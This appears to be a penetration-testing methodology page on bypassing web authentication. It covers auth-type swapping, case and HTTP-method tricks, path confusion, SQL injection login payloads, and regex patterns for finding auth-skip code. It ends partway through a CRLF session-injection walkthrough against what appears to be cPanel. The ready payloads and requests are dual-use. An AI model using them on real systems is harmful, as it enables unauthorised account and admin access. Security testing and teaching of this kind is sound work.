# Bypassing Authentication Schema

## Check List

* [ ] Ensure that authentication is applied across all services that require it.

## Methodology

### Black Box

#### Auth Type Manipulation

{% stepper %}
{% step %}
Log in to the target site, go to the authentication page, and check if it uses multiple types of authentication, such as password, email, Google, and Facebook
{% endstep %}

{% step %}
Enter the request using an incorrect password and email address. Intercept the POST request using Bupr Suite
{% endstep %}

{% step %}
Then examine the intercepted request and see if you see a parameter called `auth_type`
{% endstep %}

{% step %}
If you see such a parameter that specifies the type of authentication with Google or Facebook or password and email, send the request to the repeater
{% endstep %}

{% step %}
And then change the authentication type in the `auth_type` parameter to facebook

```json
"auth_type": "email" → "facebook"
```
{% endstep %}

{% step %}
If the user information is displayed in the server response, the authentication bypass is confirmed
{% endstep %}
{% endstepper %}

***

#### Email Domain Validation Bypass

{% stepper %}
{% step %}
Access registration form
{% endstep %}

{% step %}
Enter email `test@redacted.com`, Capture `POST` request in Burp
{% endstep %}

{% step %}
Notice server prepends or validates only suffix (`@redacted.com`)

```http
email=bishal@redacted.com
```
{% endstep %}

{% step %}
Modify email domain to any external domain

```
email=bishal0x01@bugcrowdninja.com
```
{% endstep %}

{% step %}
Send request
{% endstep %}

{% step %}
Receive verification email at `bishal0x01@bugcrowdninja.com`
{% endstep %}

{% step %}
Click link, Account activated
{% endstep %}
{% endstepper %}

***

#### Change The Letter Case

{% stepper %}
{% step %}
Use the [enumerate Application](https://unk9vvn.gitbook.io/penetration-testing/web/reconnaissance/enumerate-applications) command to perform the identification process and obtain the sensitive paths of the admin panel
{% endstep %}

{% step %}
Access known admin path

```http
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 in response, then send the following request

```http
GET /AdMiN HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
GET /Admin HTTP/1.1
GET /aDMIN HTTP/1.1
```
{% endstep %}

{% step %}
If any variation returns 200 OK, Case sensitivity bypass confirmed
{% endstep %}
{% endstepper %}

***

#### HTTP Method Bypass Auth

{% stepper %}
{% step %}
Make a request to the admin panel and check if it gives you a 403 in response
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 then change the HTTP method to PUT or Patch or ...

```http
PATCH /admin HTTP/1.1
HEAD /admin HTTP/1.1
PUT /admin HTTP/.1.1
```
{% endstep %}
{% endstepper %}

***

#### Path Confusion Auth Bypass

{% stepper %}
{% step %}
Request a sensitive route like the panel or admin route and if it gives you a 403, try to mislead the route using the payload below

```http
GET /%2e%2e/admin HTTP/1.1
```
{% endstep %}

{% step %}
If the server response shows login or admin information, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### [Bypass Auth Via SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

{% stepper %}
{% step %}
Navigate to the SignUp page of the target website, typically located at a URL like `/signup` or `/register` Open https://example.com/signup in the browser
{% endstep %}

{% step %}
Identify the “Full Name” input field in the SignUp form, which is prone to processing user input directly into database queries Find the text box labeled “Full Name” in the form
{% endstep %}

{% step %}
Enter the payload `' OR 1=1 --` into the Full Name field to attempt bypassing the query’s conditions and access unauthorized data Input `John' OR 1=1 --` in the Full Name field
{% endstep %}

{% step %}
Click the `“Sign Up”` button to send the payload to the server via a <sub>POST</sub> request
{% endstep %}

{% step %}
Look for a generic error (“Invalid input”) or a `400`/`500` status code, indicating the payload was blocked, or unexpected success, suggesting a vulnerability
{% endstep %}

{% step %}
If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again. Compare responses: if `' OR 1=1 --` allows form submission or data access (account creation without valid input) while `' OR 1=2 --` fails, it confirms SQL injection, as the true condition (`1=1`) altered the query’s logic
{% endstep %}
{% endstepper %}

***

### White Box

#### Bypass Authentication via Path Traversal

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
In the code, look for classes and functions that process authentication endpoints
{% endstep %}

{% step %}
Then, in the class that handles the authentication endpoint, look for paths in the code where exceptions exist and authentication is bypassed, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>Request\.(Path|PathBase|RawUrl))|(?<Sink>Contains\s*\(\s*"/(actuator|admin|health)"\s*\)|EndsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getNormalizeURI\s*\(|getRequestURI\s*\(|getPathInfo\s*\()|(?<Sink>contains\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_SERVER\['REQUEST_URI'\])|(?<Sink>strpos\s*\(|preg_match\s*\(|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(originalUrl|url|path))|(?<Sink>includes\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(Request\.(Path|PathBase|RawUrl))|(Contains\s*\(\s*"/(actuator|admin|health)"\s*\)|EndsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Java" %}
```regex
(getNormalizeURI\s*\(|getRequestURI\s*\(|getPathInfo\s*\()|(contains\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_SERVER\['REQUEST_URI'\])|(strpos\s*\(|preg_match\s*\(|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(originalUrl|url|path))|(includes\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```csharp
string clienturi = URIUtil.GetNormalizeURI(request);
// ...

if (clienturi.Contains("/actuator") || clienturi.EndsWith("/v1/ping") /* ... */)
{
    skipAuth = true;
}
```
{% endtab %}

{% tab title="Java" %}
```java
String clienturi = URIUtil.getNormalizeURI(request);
// ...

if (clienturi.contains("/actuator") || clienturi.endsWith("/v1/ping") /* ... */) {
    skipAuth = true;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
$clienturi = URIUtil::getNormalizeURI($request);
// ...

if (strpos($clienturi, "/actuator") !== false || str_ends_with($clienturi, "/v1/ping") /* ... */) {
    $skipAuth = true;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const clienturi = URIUtil.getNormalizeURI(request);
// ...

if (clienturi.includes("/actuator") || clienturi.endsWith("/v1/ping") /* ... */) {
    skipAuth = true;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Also review how the request is received and processed

{% tabs %}
{% tab title="C#" %}
```csharp
public static string GetNormalizeURI(HttpRequest request)
{
    string uri = request.Path.Value;
    return RemoveExtraSlash(
        Uri.UnescapeDataString(
            new Uri(uri, UriKind.RelativeOrAbsolute)
                .Normalize()
                .ToString()
        )
    );
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String getNormalizeURI(HttpServletRequest request) {
    String uri = request.getRequestURI();
    return removeExtraSlash(
        URLDecoder.decode(
            URI.create(uri).normalize().toString(),
            StandardCharsets.UTF_8
        )
    );
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function getNormalizeURI($request)
{
    $uri = $request->getRequestUri();
    return self::removeExtraSlash(
        urldecode(
            (new \GuzzleHttp\Psr7\Uri($uri))
                ->normalize()
                ->__toString()
        )
    );
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function getNormalizeURI(request) {
    const uri = request.url;
    return removeExtraSlash(
        decodeURIComponent(
            new URL(uri, 'http://localhost').pathname
        )
    );
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
The final request will look like the following

```hurl
/portalapi/v1/users/username/admin;%2fv1%2fping
```
{% endstep %}
{% endstepper %}

***

#### Authentication Bypass via Error Dispatcher

{% stepper %}
{% step %}
Map the entire target system using the Burp Suite tool
{% endstep %}

{% step %}
Map the entry points and endpoints in Xmind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Note all pre-login endpoints and license-related endpoints in the code and configuration that make security decisions based on the **URL path**, such as the path below

```hurl
/license/Unlicensed.xhtml
```
{% endstep %}

{% step %}
Intentionally add invalid paths to the URL and send requests to trigger error handling

```
/license/Unlicensed.xhtml/x
```
{% endstep %}

{% step %}
Then review this path in the code under the error-handling logic to check whether an unauthenticated user is given a session for communication or not

**VSCode (Regex Detection**)

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>HttpContext\.Items|Request\.(Query|Params))|(?<Sink>StartsWith\s*\(|Activate|License|Admin)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getAttribute\s*\(\s*"javax\.servlet\.error\.[^"]+"\s*\)|getParameter\s*\()|(?<Sink>startsWith\s*\(|requestOnlineActivation\s*\(|activate|Unlicensed\.xhtml)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(GET|REQUEST|SERVER))|(?<Sink>strpos\s*\(|activate|license|admin)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(query|originalUrl|headers))|(?<Sink>startsWith\s*\(|activate|license|admin)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux)**)

{% tabs %}
{% tab title="C#" %}
```regex
(HttpContext\.Items|Request\.(Query|Params))|(StartsWith\s*\(|Activate|License|Admin)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getAttribute\s*\(\s*"javax\.servlet\.error\.[^"]+"\s*\)|getParameter\s*\()|(?<Sink>startsWith\s*\(|requestOnlineActivation\s*\(|activate|Unlicensed\.xhtml)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|REQUEST|SERVER))|(strpos\s*\(|activate|license|admin)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(query|originalUrl|headers))|(startsWith\s*\(|activate|license|admin)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```c#
protected void DoGet(HttpRequest request, HttpResponse response)
{
    int? statusCode = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error is HttpException httpEx ? (int?)httpEx.StatusCode : null;
    string message = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error?.Message;
    Type exceptionType = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error?.GetType();
    string requestUri = request.Path;
    Exception exception = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error;
    string remoteAddr = request.HttpContext.Connection.RemoteIpAddress?.ToString();
    string gaRequestAction = request.Query["GARequestAction"];

    if (statusCode == null && exceptionType == null && exception == null)
    {
        response.StatusCode = 404;
    }
    else if (!BypassHandling(statusCode, requestUri))
    {
        if (requestUri.StartsWith(request.PathBase + "/license/Unlicensed.xhtml")) // [1]
        {
            if (!string.IsNullOrEmpty(gaRequestAction) && gaRequestAction.Equals("activate", StringComparison.OrdinalIgnoreCase))
            {
                string token = SessionUtilities.GenerateLicenseRequestToken(request.HttpContext.Session); // [2]
                try
                {
                    LicenseUtilities.RequestOnlineActivation(request, response, token); // [3]
                    return;
                }
                catch (Exception ex)
                {
                    LOGGER.LogError(ex, ex.Message);
                }
            }

            response.Redirect(requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static void doGet(HttpServletRequest req, HttpServletResponse res) throws Exception {
    Integer statusCode = req.getStatus() != 0 ? req.getStatus() : null;
    String message = req.getAttribute("message") != null ? req.getAttribute("message").toString() : null;
    Class<?> exceptionType = req.getAttribute("error") != null
            ? req.getAttribute("error").getClass()
            : null;
    String requestUri = req.getRequestURI();
    Object exception = req.getAttribute("error");
    String remoteAddr = req.getRemoteAddr();
    String gaRequestAction = req.getParameter("GARequestAction");

    if (statusCode == null && exceptionType == null && exception == null) {
        res.setStatus(HttpServletResponse.SC_NOT_FOUND);
        res.getWriter().write("Not Found");
    } else if (!bypassHandling(statusCode, requestUri)) {
        if (requestUri.startsWith(req.getContextPath() + "/license/Unlicensed.xhtml")) { // [1]
            if (gaRequestAction != null && gaRequestAction.toLowerCase().equals("activate")) {
                String token = SessionUtilities.generateLicenseRequestToken(req.getSession()); // [2]
                try {
                    LicenseUtilities.requestOnlineActivation(req, res, token); // [3]
                    return;
                } catch (Exception err) {
                    System.err.println(err.getMessage());
                    err.printStackTrace();
                }
            }

            res.sendRedirect(requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function doGet(Request $request, Response $response)
{
    $statusCode = $request->attributes->get('javax.servlet.error.status_code');
    $message = $request->attributes->get('javax.servlet.error.message');
    $exceptionType = $request->attributes->get('javax.servlet.error.exception_type');
    $requestUri = $request->attributes->get('javax.servlet.error.request_uri');
    $exception = $request->attributes->get('javax.servlet.error.exception');
    $remoteAddr = $request->ip();
    $gaRequestAction = $request->query('GARequestAction');

    if ($statusCode === null && $exceptionType === null && $exception === null) {
        return response()->setStatusCode(404);
    } elseif (!$this->bypassHandling($statusCode, $requestUri)) {
        if (str_starts_with($requestUri, $request->getBasePath() . "/license/Unlicensed.xhtml")) { // [1]
            if (!empty($gaRequestAction) && strcasecmp($gaRequestAction, "activate") === 0) {
                $token = SessionUtilities::generateLicenseRequestToken($request->session()); // [2]
                try {
                    LicenseUtilities::requestOnlineActivation($request, $response, $token); // [3]
                    return;
                } catch (\Exception $e) {
                    $this->LOGGER->error($e->getMessage(), ['exception' => $e]);
                }
            }

            return redirect($requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
async function doGet(req, reply) {
    const statusCode = req.statusCode || null;
    const message = req.message || null;
    const exceptionType = req.error?.constructor || null;
    const requestUri = req.url;
    const exception = req.error || null;
    const remoteAddr = req.ip;
    const gaRequestAction = req.query.GARequestAction;

    if (!statusCode && !exceptionType && !exception) {
        reply.status(404).send('Not Found');
    } else if (!bypassHandling(statusCode, requestUri)) {
        if (requestUri.startsWith(req.routerPath + "/license/Unlicensed.xhtml")) { // [1]
            if (gaRequestAction && gaRequestAction.toLowerCase() === "activate") {
                const token = SessionUtilities.generateLicenseRequestToken(req.session); // [2]
                try {
                    await LicenseUtilities.requestOnlineActivation(req, reply, token); // [3]
                    return;
                } catch (err) {
                    req.log.error(err.message, err);
                }
            }

            reply.redirect(requestUri);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Finally, by abusing the path error, it is possible to obtain a session for connection and interaction
{% endstep %}
{% endstepper %}

***

#### Bypass Authentication via CRLF Injection in Session

{% stepper %}
{% step %}
Send a failed login request so that a session is created in the response, and capture the `cookie/session` identifier

Request :

```http
POST /login/?login_only=1 HTTP/1.1
Host: target:2087
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

user=root&pass=wrong
```

Response :

```http
HTTP/1.1 401 Access Denied
Set-Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK%2c1bd3d4bf5ecbf83b660789ab0f3198fa; HttpOnly; path=/; port=2087; secure
Content-Type: text/plain; charset="utf-8"
Content-Length: 38

{"status":0,"message":"see_login_log"}
```
{% endstep %}

{% step %}
Decode the session value, analyze its structure, and review the related logic in the codebase. (Check whether it includes extra parts such as secret/metadata. Note: in the code below, `ob` represents the secret key or metadata)
{% endstep %}

{% step %}
Extract the secret value (named `ob` in this code). For example, in the response it may look like `c1bd3d4bf5ecbf83b660789ab0f3198fa` in Hex format

{% tabs %}
{% tab title="Perl" %}
```perl
sub saveSession {
       my ( $session, $session_ref, %options ) = @_;
       ...
       my $ob = get_ob_part( \$session );
       return 0 if !is_valid_session_name($session);

  -    my $encoder = $ob && Cpanel::Session::Encoder->new( 'secret' => $ob );
  -    local $session_ref->{'pass'} = $encoder->encode_data( $session_ref->{'pass'} )
  -      if $encoder && length $session_ref->{'pass'};
  +    filter_sessiondata($session_ref);                            
  +    if ( length $session_ref->{'pass'} ) {
  +        if ( defined $ob && length $ob ) {
  +            my $encoder = Cpanel::Session::Encoder->new( 'secret' => $ob );
  +            $session_ref->{'pass'} = $encoder->encode_data( $session_ref->{'pass'} );
  +        }
  +        else {
  +            $session_ref->{'pass'} =                                
  +              'no-ob:' . Cpanel::Session::Encoder->hex_encode_only( $session_ref->{'pass'} );
  +        }
  +    }
       ...
   }
```
{% endtab %}

{% tab title="C#" %}
```csharp
public int SaveSession(ref string session, Dictionary<string, object> session_ref, Dictionary<string, object> options)
{
    var ob = GetObPart(ref session);

    if (!IsValidSessionName(session))
        return 0;

    FilterSessionData(session_ref);

    if (session_ref.ContainsKey("pass") && session_ref["pass"] != null && session_ref["pass"].ToString().Length > 0)
    {
        if (ob != null && ob.Length > 0)
        {
            var encoder = new Cpanel.Session.Encoder(new Dictionary<string, object> { { "secret", ob } });
            session_ref["pass"] = encoder.EncodeData(session_ref["pass"].ToString());
        }
        else
        {
            session_ref["pass"] = "no-ob:" + Cpanel.Session.Encoder.HexEncodeOnly(session_ref["pass"].ToString());
        }
    }

    return 1;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public int saveSession(String session, Map<String, Object> session_ref, Map<String, Object> options) {

    String ob = getObPart(session);

    if (!isValidSessionName(session)) {
        return 0;
    }

    filterSessiondata(session_ref);

    if (session_ref.containsKey("pass") && session_ref.get("pass") != null && session_ref.get("pass").toString().length() > 0) {

        if (ob != null && ob.length() > 0) {
            Encoder encoder = new Encoder(ob);
            session_ref.put("pass", encoder.encodeData(session_ref.get("pass").toString()));
        } else {
            session_ref.put("pass", "no-ob:" + Encoder.hexEncodeOnly(session_ref.get("pass").toString()));
        }
    }

    return 1;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function saveSession(&$session, &$session_ref, $options = [])
{
    $ob = get_ob_part($session);

    if (!is_valid_session_name($session)) {
        return 0;
    }

    filter_sessiondata($session_ref);

    if (!empty($session_ref['pass'])) {

        if (isset($ob) && strlen($ob) > 0) {
            $encoder = new Cpanel_Session_Encoder(['secret' => $ob]);
            $session_ref['pass'] = $encoder->encode_data($session_ref['pass']);
        } else {
            $session_ref['pass'] = 'no-ob:' . Cpanel_Session_Encoder::hex_encode_only($session_ref['pass']);
        }
    }

    return 1;
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function saveSession(session, session_ref, options = {}) {

    let ob = get_ob_part(session);

    if (!is_valid_session_name(session)) {
        return 0;
    }

    filter_sessiondata(session_ref);

    if (session_ref.pass && session_ref.pass.length > 0) {

        if (ob && ob.length > 0) {
            let encoder = new Cpanel.Session.Encoder({ secret: ob });
            session_ref.pass = encoder.encode_data(session_ref.pass);
        } else {
            session_ref.pass = 'no-ob:' + Cpanel.Session.Encoder.hex_encode_only(session_ref.pass);
        }
    }

    return 1;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether, besides the session ID, a **secondary secret or token** is used to protect the data (such as encoding/encryption)
{% endstep %}

{% step %}
Review filtering functions to see what data is removed from the session

{% tabs %}
{% tab title="Perl" %}
```perl
sub filter_sessiondata {
    my ($session_ref) = @_;
    no warnings 'uninitialized';    ## no critic(ProhibitNoWarnings)

    # Prevent manipulation of other entries in session file
    tr{\r\n=\,}{}d for values %{ $session_ref->{'origin'} };

    # Prevent manipulation of other entries in session file
    tr{\r\n}{}d for @{$session_ref}{ grep { $_ ne 'origin' } keys %{$session_ref} };

    # Cleanup possible directory traversal ( A valid 'pass' may have these chars )
    tr{/}{}d for @{$session_ref}{ grep { exists $session_ref->{$_} } qw(user login_theme theme lang) };
    return $session_ref;
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public static Dictionary<string, object> FilterSessionData(Dictionary<string, object> session_ref)
{
    // Prevent manipulation of other entries in session file
    if (session_ref.ContainsKey("origin") && session_ref["origin"] is Dictionary<string, string> originDict)
    {
        var keys = new List<string>(originDict.Keys);
        foreach (var key in keys)
        {
            string value = originDict[key] ?? "";
            value = value.Replace("\r", "").Replace("\n", "").Replace("=", "").Replace(",", "");
            originDict[key] = value;
        }
    }

    // Prevent manipulation of other entries in session file
    foreach (var key in new List<string>(session_ref.Keys))
    {
        if (key != "origin" && session_ref[key] != null)
        {
            string value = session_ref[key].ToString();
            value = value.Replace("\r", "").Replace("\n", "");
            session_ref[key] = value;
        }
    }

    // Cleanup possible directory traversal
    string[] fields = { "user", "login_theme", "theme", "lang" };
    foreach (var field in fields)
    {
        if (session_ref.ContainsKey(field) && session_ref[field] != null)
        {
            string value = session_ref[field].ToString();
            value = value.Replace("/", "");
            session_ref[field] = value;
        }
    }

    return session_ref;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static Map<String, Object> filterSessiondata(Map<String, Object> session_ref) {

    // Prevent manipulation of other entries in session file
    if (session_ref.containsKey("origin") && session_ref.get("origin") instanceof Map) {
        Map<String, String> origin = (Map<String, String>) session_ref.get("origin");
        for (Map.Entry<String, String> entry : origin.entrySet()) {
            String value = entry.getValue() == null ? "" : entry.getValue();
            value = value.replaceAll("[\\r\\n=,]", "");
            entry.setValue(value);
        }
    }

    // Prevent manipulation of other entries in session file
    for (String key : session_ref.keySet()) {
        if (!key.equals("origin") && session_ref.get(key) != null) {
            String value = session_ref.get(key).toString();
            value = value.replaceAll("[\\r\\n]", "");
            session_ref.put(key, value);
        }
    }

    // Cleanup possible directory traversal
    String[] fields = {"user", "login_theme", "theme", "lang"};
    for (String field : fields) {
        if (session_ref.containsKey(field) && session_ref.get(field) != null) {
            String value = session_ref.get(field).toString();
            value = value.replace("/", "");
            session_ref.put(field, value);
        }
    }

    return session_ref;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function filter_sessiondata(&$session_ref)
{
    // Prevent manipulation of other entries in session file
    if (isset($session_ref['origin']) && is_array($session_ref['origin'])) {
        foreach ($session_ref['origin'] as $key => $value) {
            $value = str_replace(["\r", "\n", "=", ","], "", $value ?? "");
            $session_ref['origin'][$key] = $value;
        }
    }

    // Prevent manipulation of other entries in session file
    foreach ($session_ref as $key => $value) {
        if ($key !== 'origin' && $value !== null) {
            $session_ref[$key] = str_replace(["\r", "\n"], "", $value);
        }
    }

    // Cleanup possible directory traversal
    $fields = ['user', 'login_theme', 'theme', 'lang'];
    foreach ($fields as $field) {
        if (isset($session_ref[$field])) {
            $session_ref[$field] = str_replace("/", "", $session_ref[$field]);
        }
    }

    return $session_ref;
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function filter_sessiondata(session_ref) {

    // Prevent manipulation of other entries in session file
    if (session_ref.origin && typeof session_ref.origin === "object") {
        for (let key in session_ref.origin) {
            let value = session_ref.origin[key] || "";
            value = value.replace(/[\r\n=,]/g, "");
            session_ref.origin[key] = value;
        }
    }

    // Prevent manipulation of other entries in session file
    for (let key in session_ref) {
        if (key !== "origin" && session_ref[key] != null) {
            let value = session_ref[key].toString();
            value = value.replace(/[\r\n]/g, "");
            session_ref[key] = value;
        }
    }

    // Cleanup possible directory traversal
    let fields = ["user", "login_theme", "theme", "lang"];
    for (let field of fields) {
        if (session_ref[field]) {
            session_ref[field] = session_ref[field].replace(/\//g, "");
        }
    }

    return session_ref;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Find the session storage path on the server and analyze the structure of the session file/data
{% endstep %}

{% step %}
Check what data is stored in the session before authentication (initial system state)

```bash
$ cat /var/cpanel/sessions/raw/:Wg_mjzgt1hyfXefK

local_ip_address=172.17.0.2
external_validation_token=bOOwkwVzFsruooU0
cp_security_token=/cpsess7833455106
needs_auth=1
origin_as_string=address=172.17.0.1,app=whostmgrd,method=badpass
hulk_registered=0
tfa_verified=0
ip_address=172.17.0.1
local_port=2087
port=49254
login_theme=cpanel
```
{% endstep %}

{% step %}
Then check whether additional data is stored in the session file after authentication (for example user, pass)
{% endstep %}

{% step %}
Check under what conditions security mechanisms are enabled or disabled (for example based on a specific secret or NULL value), and design a scenario to disable the protection
{% endstep %}

{% step %}
If security mechanisms are disabled, check whether sensitive data is stored in raw form (such as passwords). If so, the session-saving function becomes a dangerous sink. Then review the entire codebase to find where this function is called
{% endstep %}

{% step %}
In the code, find headers such as **Authentication Header** (for example `Authorization: Basic`) and review how they are processed. Check whether inputs like username and password are validated or filtered, and whether the dangerous sink (`saveSession`) is used

{% tabs %}
{% tab title="Perl" %}
```perl
my $auth_header = $server_obj->request->get_headers->{'authorization'};
if (not $auth_header) {
    $server_obj->badpass('preserve_token', 1, 'noauth', 1);
}
else {
    my ($authtype, $encoded) = split(/\s+/, $auth_header, 2);
    if ($authtype =~ /^basic$/i) {
        my ($user, $pass) = split(/:/, decode_base64($encoded), 2);
        ...
        $user = $server_obj->auth->set_user($user);   # حذف \0 و /
        $pass = $server_obj->auth->set_pass($pass);   # فقط حذف \0
        ...

        if (defined $SESSION_ref) {
            my $safe_login = $SESSION_ref->{'needs_auth'} ? 1 : 0;
            if (defined $SESSION_ref->{'user'}
                and defined $SESSION_ref->{'pass'}
                and $SESSION_ref->{'user'} eq $user
                and $SESSION_ref->{'pass'} eq $pass)
            {
                $safe_login = 1;
            }
            else {
                $SESSION_ref->{'needs_auth'} = 1;
            }
            ...
            if ($SESSION_ref->{'needs_auth'}) {
                delete $SESSION_ref->{'needs_auth'};
                $SESSION_ref->{'user'} = $user;
                $SESSION_ref->{'pass'} = $pass;       # (1) مقدار pass کنترل‌شده توسط attacker
                unless (Cpanel::Session::saveSession($session, $SESSION_ref)) { // (2)
                    $server_obj->badpass(...);
                }
            }
            ...
        }
    }
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
var auth_header = server_obj.request.get_headers()["authorization"];

if (auth_header == null)
{
    server_obj.badpass("preserve_token", 1, "noauth", 1);
}
else
{
    var parts = auth_header.Split(new[] { ' ' }, 2);
    var authtype = parts[0];
    var encoded = parts.Length > 1 ? parts[1] : null;

    if (System.Text.RegularExpressions.Regex.IsMatch(authtype, "^basic$", System.Text.RegularExpressions.RegexOptions.IgnoreCase))
    {
        var decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
        var creds = decoded.Split(new[] { ':' }, 2);

        var user = creds[0];
        var pass = creds.Length > 1 ? creds[1] : null;

        user = server_obj.auth.set_user(user);
        pass = server_obj.auth.set_pass(pass);

        if (SESSION_ref != null)
        {
            int safe_login = SESSION_ref.ContainsKey("needs_auth") ? 1 : 0;

            if (SESSION_ref.ContainsKey("user")
                && SESSION_ref.ContainsKey("pass")
                && SESSION_ref["user"].ToString() == user
                && SESSION_ref["pass"].ToString() == pass)
            {
                safe_login = 1;
            }
            else
            {
                SESSION_ref["needs_auth"] = 1;
            }

            if (SESSION_ref.ContainsKey("needs_auth"))
            {
                SESSION_ref.Remove("needs_auth");
                SESSION_ref["user"] = user;
                SESSION_ref["pass"] = pass;

                if (!Cpanel.Session.saveSession(session, SESSION_ref))
                {
                    server_obj.badpass();
                }
            }
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
String auth_header = server_obj.getRequest().getHeaders().get("authorization");

if (auth_header == null) {
    server_obj.badpass("preserve_token", 1, "noauth", 1);
} else {

    String[] parts = auth_header.split("\\s+", 2);
    String authtype = parts[0];
    String encoded = parts.length > 1 ? parts[1] : null;

    if (authtype.equalsIgnoreCase("basic")) {

        String decoded = new String(Base64.getDecoder().decode(encoded));
        String[] creds = decoded.split(":", 2);

        String user = creds[0];
        String pass = creds.length > 1 ? creds[1] : null;

        user = server_obj.getAuth().setUser(user);
        pass = server_obj.getAuth().setPass(pass);

        if (SESSION_ref != null) {

            int safe_login = SESSION_ref.containsKey("needs_auth") ? 1 : 0;

            if (SESSION_ref.containsKey("user")
                    && SESSION_ref.containsKey("pass")
                    && SESSION_ref.get("user").equals(user)
                    && SESSION_ref.get("pass").equals(pass)) {

                safe_login = 1;
            } else {
                SESSION_ref.put("needs_auth", 1);
            }

            if (SESSION_ref.containsKey("needs_auth")) {
                SESSION_ref.remove("needs_auth");
                SESSION_ref.put("user", user);
                SESSION_ref.put("pass", pass);

                if (!Cpanel.Session.saveSession(session, SESSION_ref)) {
                    server_obj.badpass();
                }
            }
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
$auth_header = $server_obj->request->get_headers()['authorization'] ?? null;

if (!$auth_header) {
    $server_obj->badpass('preserve_token', 1, 'noauth', 1);
} else {

    $parts = preg_split('/\s+/', $auth_header, 2);
    $authtype = $parts[0];
    $encoded = $parts[1] ?? null;

    if (preg_match('/^basic$/i', $authtype)) {

        $decoded = base64_decode($encoded);
        $creds = explode(':', $decoded, 2);

        $user = $creds[0];
        $pass = $creds[1] ?? null;

        $user = $server_obj->auth->set_user($user);
        $pass = $server_obj->auth->set_pass($pass);

        if (isset($SESSION_ref)) {

            $safe_login = isset($SESSION_ref['needs_auth']) ? 1 : 0;

            if (isset($SESSION_ref['user'])
                && isset($SESSION_ref['pass'])
                && $SESSION_ref['user'] === $user
                && $SESSION_ref['pass'] === $pass) {

                $safe_login = 1;
            } else {
                $SESSION_ref['needs_auth'] = 1;
            }

            if (isset($SESSION_ref['needs_auth'])) {
                unset($SESSION_ref['needs_auth']);
                $SESSION_ref['user'] = $user;
                $SESSION_ref['pass'] = $pass;

                if (!Cpanel_Session::saveSession($session, $SESSION_ref)) {
                    $server_obj->badpass();
                }
            }
        }
    }
}
```
{% endtab %}

